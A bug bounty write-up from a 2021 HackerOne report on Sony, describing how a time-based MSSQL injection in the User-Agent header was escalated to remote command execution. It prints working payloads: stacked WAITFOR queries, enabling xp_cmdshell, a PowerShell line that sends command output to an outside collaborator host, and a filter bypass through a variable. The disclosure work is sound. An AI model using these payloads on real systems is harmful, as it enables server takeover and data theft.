---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2021-10-17_how-i-escalated-a-time-based-sql-injection-to-rce.md
original_filename: 2021-10-17_how-i-escalated-a-time-based-sql-injection-to-rce.md
title: How I Escalated a Time-Based SQL Injection to RCE
category: documents
detected_topics:
- command-injection
- sqli
- cloud-security
tags:
- imported
- documents
- command-injection
- sqli
- cloud-security
language: en
raw_sha256: 896b3f1c9f0c6389cc9913f296fdf1577a0a86526b4d808457fef507b0967c75
text_sha256: ce48448ac4b17a70dc071cfdb906e8ae16e281100a38d29efb1658b83003228e
ingested_at: '2026-06-28T07:32:08Z'
sensitivity: unknown
redactions_applied: true
---

# How I Escalated a Time-Based SQL Injection to RCE

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2021-10-17_how-i-escalated-a-time-based-sql-injection-to-rce.md
- Source Type: markdown
- Detected Topics: command-injection, sqli, cloud-security
- Ingested At: 2026-06-28T07:32:08Z
- Redactions Applied: True
- Raw SHA256: `896b3f1c9f0c6389cc9913f296fdf1577a0a86526b4d808457fef507b0967c75`
- Text SHA256: `ce48448ac4b17a70dc071cfdb906e8ae16e281100a38d29efb1658b83003228e`


## Content

---
title: "How I Escalated a Time-Based SQL Injection to RCE"
url: "https://infosecwriteups.com/how-i-escalated-a-time-based-sql-injection-to-rce-bbf0d68cb398"
authors: ["JM Sanchez / 0xEchidonut (@jmrcsnchz)"]
programs: ["Sony"]
bugs: ["SQL injection", "RCE"]
publication_date: "2021-10-17"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 3235
scraped_via: "browseros"
---

# How I Escalated a Time-Based SQL Injection to RCE

How I Escalated a Time-Based SQL Injection to RCE
0xEchidonut
Follow
4 min read
·
Oct 17, 2021

1K

8

Good day everyone! I hope all of you are doing well.

Today, I will be sharing one of my report on Sony, a public program in HackerOne, and methods on how I escalated it from a Blind Time-based SQL Injection to a Full Remote OS Command Execution.

I will be redacting important details such as domains, subdomains, command outputs, my IP address, server IP address, and more.

Recon Stage:

For the recon stage, I used sublist3r to find subdomains of the given domain.

I checked all the sub-domains, but all of them are dead links. Disappointed, I tried other recon tools like amass. Surprisingly, it gave me better results

amass gave me subdomains that can’t be seen in simple google queries. (I won’t be showing screenshots of this, sorry). It gave me a subdomain like this:

special.target.com

Familiarizing with the Target

Now I accessed the site, it looks like an admin panel or employee login page

I tried the classic ' symbol to check for sql errors. I entered username=123'&password=***REDACTED***

I checked the burpsuite requests, and the endpoint returned a fruitful 500 Error page. Why fruitful? The devs forgot to turn off their debug mode or something, which allows me to view the full query, and full path of files.

The endpoint is vulnerable to Microsoft SQL Injection.

Actual Exploitation

I tried simple Boolean SQL injections on the username parameter, but found no luck. Any payload shows errors. I looked again in the query error and realized that my User-Agent Header is passed on to the database. I added single quote and comment ‘-- to my user-agent and it returns the usual correct page.

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36'--

This is a good indication that the server executes user supplied input. Next, I checked for time-based SQL injection to see if I can stack queries

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36';WAITFOR DELAY ‘00:00:05’;--

Then the response is delayed by ~5 seconds

This confirms that we can stack SQL queries and inject any command we want.

Escalating SQL Injection to RCE

Since we know that we can stack queries, let’s find a way to execute OS commands here. Unlike MySQL, MSSQL offers a way to execute commands. I based on this writeup by 
Prashant Kumar

Get 0xEchidonut’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

I just found out that we can exec OS commands using xp_cmdshell, so I enabled xp_cmdshell in their server

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36'; EXEC sp_configure ‘show advanced options’, 1; RECONFIGURE; EXEC sp_configure ‘xp_cmdshell’, 1; RECONFIGURE;--

Then I tested for a blind RCE using ping

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36'; EXEC xp_cmdshell 'ping myburpcollablink.burpcollaborator.net';--

Press enter or click to view image in full size

Boom! We got hits on or Burpsuite Collaborator Client. This confirms that we can do RCE.

Unlike the writeup above that stores the command output in the database, I made a non-destructive way to read OS Command outputs.

I made this by assigning the output to a variable in powershell and sending them to my BurpCollaborator using curl

It works like this:
powershell -c “$x = whoami; curl http://my-burp-link.burpcollaborator.net/get?output=$x”

The command above gets the output of whoami and sends them to my burpcollab link

The final RCE payload looks like this:

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36';EXEC xp_cmdshell ‘powershell -c “$x = whoami; curl http://my-burp-link.burpcollaborator.net/get?output=$x"';--

The command output got sent back to me as expected

Press enter or click to view image in full size

I was also able to retrieve their AWS EC2 instances’ metadata information, see server files, and more.

Bypassing the “Fix”

After a few days, Sony told me they deployed a patch. I tried my old payload and it was blocked by the firewall. I saw that they included the keyword EXEC xp_cmdshell in their filter.

I bypassed the filter by declaring a variable @x with value xp_cmdshell and doing something like EXEC @x

‘; DECLARE @x AS VARCHAR(100)=’xp_cmdshell’; EXEC @x ‘ping k7s3rpqn8ti91kvy0h44pre35ublza.burpcollaborator.net’ —

Timeline:

Sept. 14, 2021-> First Reported
Sept. 16, 2021 -> Triaged by Hackerone
Sept. 21, 2021 -> Initial Patch Deployed (Bypassed)
Sept. 23, 2021 -> Another Patch Deployed (Bypassed Again)
Sept. 26, 2021 -> Final Patch Deployed
Sept. 27, 2021 -> Marked as Resolved and Swag was awarded
Press enter or click to view image in full size

Thank you very much Sony for letting us test your assets. Thanks for the awesome swag
